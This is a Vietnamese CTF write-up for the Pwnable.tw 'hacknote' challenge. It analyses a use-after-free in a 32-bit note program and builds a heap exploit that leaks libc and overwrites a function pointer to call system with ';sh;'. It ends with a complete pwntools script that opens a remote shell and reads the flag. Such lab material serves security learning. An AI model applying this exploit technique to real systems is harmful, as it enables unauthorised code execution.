+++
title = 'Pwnable.tw - hacknote'
date = 2025-11-07T19:14:04+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## hacknote

`nc chall.pwnable.tw 10102`

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/hacknote/hacknote_patched
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x8046000)
RUNPATH:    b'.'
```

libc đi kèm glibc 2.23 nên chưa có tcache, chunk nhỏ đi vào fastbin.

Menu: `1. Add note`, `2. Delete note`, `3. Print note`, `4. Exit`. Mảng note global ở `0x804a050`, counter ở `0x804a04c`, tối đa 5 note.

Mỗi note là một struct **8 byte**:

```c
struct note {
    void (*print)(struct note *);   // +0x00
    char *content;                  // +0x04
};
```

`add_note` @ `0x8048646`:

```asm
 8048698:  push   0x8
 804869a:  call   80484c0 <malloc@plt>        ; malloc(8) cho struct
 80486a7:  mov    DWORD PTR [eax*4+0x804a050],edx
 80486e0:  mov    DWORD PTR [eax],0x804862b   ; note->print = print_note_content
 ...                                          ; rồi malloc(size) cho content
```

Hàm in ở `0x804862b`:

```asm
0804862b:
 8048631:  mov    eax,DWORD PTR [ebp+0x8]     ; note
 8048634:  mov    eax,DWORD PTR [eax+0x4]     ; note->content
 804863b:  call   80484d0 <puts@plt>          ; puts(note->content)
```

Còn `print_note` gọi `note->print(note)` - một **con trỏ hàm nằm trên heap**.

#### Bug - Use After Free

`delete_note` gọi `free(note->content)` rồi `free(note)` nhưng **không set slot trong mảng về NULL**. Note đã xoá vẫn in được qua option 3, và con trỏ hàm của nó vẫn được gọi.

Struct 8 byte rơi vào `fastbin[0x10]`. Vì content có thể xin size tuỳ ý, chỉ cần `add` một note mới với content nhỏ (ví dụ 10 byte → chunk `0x10`) là chunk content ấy **được cấp đúng vào vùng struct vừa free**, và ta kiểm soát hoàn toàn 8 byte đó: `note->print` và `note->content`.

### 2. Khai thác

#### Leak libc

```py
add(32, b'A'*4)     # note 0: struct + content
add(32, b'B'*4)     # note 1
delete(0)
delete(1)           # fastbin[0x10] giờ có các chunk struct vừa free

puts = 0x804862B    # print_note_content
add(10, p32(puts) + p32(exe.got['puts']))   # note 2: content chiếm chunk struct của note 0
view(0)
```

Note 2 xin content 10 byte → chunk `0x10`, malloc trả về đúng chunk struct của note 0 (fastbin LIFO). Dữ liệu ghi vào thành:

```js
note0->print   = 0x804862b   (print_note_content)
note0->content = puts@got
```

`view(0)` gọi `note0->print(note0)` = `print_note_content(note0)` = `puts(puts@got)` → in ra địa chỉ `puts` thật.

Dùng lại chính hàm in của chương trình thay vì `puts@plt` để không phải lo tham số: nó tự lấy `note->content` làm đối số.

```py
leak = u32(r(4))
libc.address = leak - libc.sym.puts
```

#### Lấy shell

```py
delete(2)                              # trả chunk đó về fastbin
add(10, p32(system) + b';sh;')         # chiếm lại, print = system
view(0)
```

Lần này `note0->print = system`, và `view(0)` gọi `system(note0)` với `note0` trỏ vào chính 8 byte `<system>;sh;`. Bốn byte đầu là địa chỉ `system` dạng nhị phân nên `sh` báo lỗi cú pháp cho phần đó, nhưng dấu `;` tách lệnh và `sh` phía sau chạy được.

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('hacknote_patched', checksec=False)
libc = ELF('libc_32.so.6', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'

info = lambda msg: log.info(msg)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda n=4096, proc=None: proc.recv(n) if proc else p.recv(n)

if args.REMOTE:
    p = remote("chall.pwnable.tw", int("10102"))
else:
    p = process([exe.path])

def add(size, content):
    slna(b'choice :', 1)
    slna(b'size :', size)
    sla(b'Content :', content)

def delete(index):
    slna(b'choice :', 2)
    slna(b'Index :', index)

def view(index):
    slna(b'choice :', 3)
    slna(b'Index :', index)

add(32, b'A'*4)
add(32, b'B'*4)

delete(0)
delete(1)

puts = 0x804862B
add(10, p32(puts) + p32(exe.got['puts']))
view(0)

leak = u32(r(4))
libc.address = leak - libc.sym.puts
info(f'leak: {hex(leak)}')
info(f'base: {hex(libc.address)}')

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
info(f'system: {hex(system)}')
info(f'/bin/sh: {hex(binsh)}')

delete(2)

add(10, p32(system) + b';sh;')
view(0)

sl('cat /home/hacknote/flag')

p.interactive()
```
